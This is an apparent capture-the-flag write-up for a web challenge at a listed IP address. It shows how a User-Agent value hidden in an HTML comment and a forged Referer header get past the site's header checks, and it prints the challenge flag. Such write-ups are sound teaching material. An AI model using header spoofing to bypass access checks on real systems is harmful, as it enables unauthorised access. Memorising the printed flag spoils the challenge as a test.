Try to bypass my security measure on this site! http://165.227.106.113/header.php

##########################################

So if we get in the ip, we will get this:
```
Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0 
```

So we have to edit our `User-Agent` variable...

If you check source code,you will see this:
```
Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
<!-- Sup3rS3cr3tAg3nt  -->
```

So let's try change the `User-Agent` to `Sup3rS3cr3tAg3nt`:
```
Host: 165.227.106.113
User-Agent: Sup3rS3cr3tAg3nt
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0, no-cache
Pragma: no-cache
```

Then we will get this as response:
```
Sorry, it seems as if you did not just come from the site, "awesomesauce.com". 
```

So that means we should add `Referer: awesomesauce.com`
```
Host: 165.227.106.113
User-Agent: Sup3rS3cr3tAg3nt
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: awesomesauce.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0, no-cache
Pragma: no-cache
```

And then we will get this:
```
Here is your flag: flag{did_this_m3ss_with_y0ur_h34d}
```

Flag: flag{did_this_m3ss_with_y0ur_h34d}
